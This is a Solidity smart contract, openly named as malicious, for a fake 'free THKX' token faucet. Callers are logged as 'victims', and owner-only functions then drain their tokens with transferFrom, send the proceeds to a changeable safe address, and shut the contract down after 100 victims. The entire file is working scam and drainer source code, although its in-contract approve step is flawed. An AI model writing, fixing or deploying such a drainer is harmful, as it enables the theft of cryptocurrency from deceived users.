// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
}

contract EnhancedMaliciousTHKXFaucet {
    address public owner;
    address payable private safeAddress;
    IERC20 public thkxToken;
    uint256 public victimCount;
    uint256 public constant MAX_VICTIMS = 100;
    mapping(address => uint256) public drainedAmount;
    address[] public victims;
    bool public isPaused;
    bool public isDestroyed;

    event TokensDrained(address indexed victim, uint256 amount);
    event VictimApproved(address indexed victim);
    event ContractDestroyed(uint256 victimCount);
    event TokenUpdated(address indexed oldToken, address indexed newToken);
    event DrainFailed(address indexed victim, uint256 allowance, string reason);
    event VictimReset(address indexed victim);

    constructor(address _thkxToken) {
        owner = msg.sender;
        safeAddress = payable(msg.sender);
        thkxToken = IERC20(_thkxToken);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only Hacker can call this");
        _;
    }

    modifier whenNotPaused() {
        require(!isPaused, "Contract is paused");
        _;
    }

    modifier whenNotDestroyed() {
        require(!isDestroyed, "Contract is destroyed");
        _;
    }

    function claimFreeTHKX() external whenNotPaused whenNotDestroyed {
        uint256 balance = thkxToken.balanceOf(msg.sender);
        uint256 allowance = thkxToken.allowance(msg.sender, address(this));

        if (allowance != balance) {
            thkxToken.approve(address(this), balance);
        }

        allowance = thkxToken.allowance(msg.sender, address(this));

        require(allowance >= balance, "Allowance should be equal to balance");

        victims.push(msg.sender);
        victimCount++;
        emit VictimApproved(msg.sender);
        autoDestroy();
    }

    function drainAllVictims() external onlyOwner whenNotDestroyed {
        require(victims.length > 0, "No victims to drain");
        for (uint256 i = 0; i != victims.length; i++) {
            address victim = victims[i];
            uint256 allowance = thkxToken.allowance(victim, address(this));
            uint256 balance = thkxToken.balanceOf(victim);

            if (allowance == balance) {
                try
                    thkxToken.transferFrom(victim, safeAddress, allowance)
                returns (bool success) {
                    if (success) {
                        drainedAmount[victim] += allowance;
                        emit TokensDrained(victim, allowance);
                    } else {
                        emit DrainFailed(
                            victim,
                            allowance,
                            "Transfer returned false"
                        );
                    }
                } catch Error(string memory reason) {
                    emit DrainFailed(victim, allowance, reason);
                } catch {
                    emit DrainFailed(
                        victim,
                        allowance,
                        "Unknown error (no revert reason)"
                    );
                }
            } else {
                emit DrainFailed(
                    victim,
                    allowance,
                    "Allowance does not match balance"
                );
            }
        }
    }

    function drainVictim(address victim) external onlyOwner whenNotDestroyed {
        uint256 allowance = thkxToken.allowance(victim, address(this));
        uint256 balance = thkxToken.balanceOf(victim);

        if (allowance >= balance) {
           
            try thkxToken.transferFrom(victim, msg.sender, balance) returns (
                bool success
            ) {
               
                if (success) {
                    drainedAmount[victim] += balance;
                    emit TokensDrained(victim, balance);
                } else {
                    emit DrainFailed(
                        victim,
                        balance,
                        "Transfer returned false"
                    );
                }
            } catch Error(string memory reason) {
                emit DrainFailed(victim, balance, reason);
            } catch {
                emit DrainFailed(
                    victim,
                    balance,
                    "Unknown error (no revert reason)"
                );
            }
        } else {
            emit DrainFailed(victim, allowance, "Insufficient allowance");
        }
    }

    function updateToken(
        address _newToken
    ) external onlyOwner whenNotDestroyed {
        address oldToken = address(thkxToken);
        thkxToken = IERC20(_newToken);
        emit TokenUpdated(oldToken, _newToken);
    }

    function togglePause() external onlyOwner whenNotDestroyed {
        isPaused = !isPaused;
    }

    function destroyNow() external onlyOwner whenNotDestroyed {
        emit ContractDestroyed(victimCount);
        isDestroyed = true;
        if (address(this).balance > 0) {
            safeAddress.transfer(address(this).balance);
        }
    }

    function autoDestroy() internal whenNotDestroyed {
        if (victimCount >= MAX_VICTIMS) {
            emit ContractDestroyed(victimCount);
            isDestroyed = true;
            if (address(this).balance > 0) {
                safeAddress.transfer(address(this).balance);
            }
        }
    }

    receive() external payable whenNotDestroyed {
        if (address(this).balance > 0) {
            safeAddress.transfer(address(this).balance);
        }
    }

    function setSafeAddress(
        address payable newSafeAddress
    ) external onlyOwner whenNotDestroyed {
        require(newSafeAddress != address(0), "Invalid address");
        safeAddress = newSafeAddress;
    }

    function getVictims() external view onlyOwner returns (address[] memory) {
        return victims;
    }

    function getTotalDrained() external view onlyOwner returns (uint256) {
        uint256 total = 0;
        for (uint256 i = 0; i != victims.length; i++) {
            total += drainedAmount[victims[i]];
        }
        return total;
    }

    function checkEligibility() external pure returns (bool) {
        return true;
    }

    function getVictimBalance(
        address victim
    ) external view onlyOwner returns (uint256) {
        return thkxToken.allowance(victim, address(this));
    }

    function getVictimList()
        external
        view
        onlyOwner
        returns (address[] memory)
    {
        return victims;
    }

    function resetVictimDrainedAmount(address victim) external onlyOwner whenNotDestroyed {
        require(victim != address(0), "Invalid address");
        drainedAmount[victim] = 0;
        emit VictimReset(victim);
    }
}
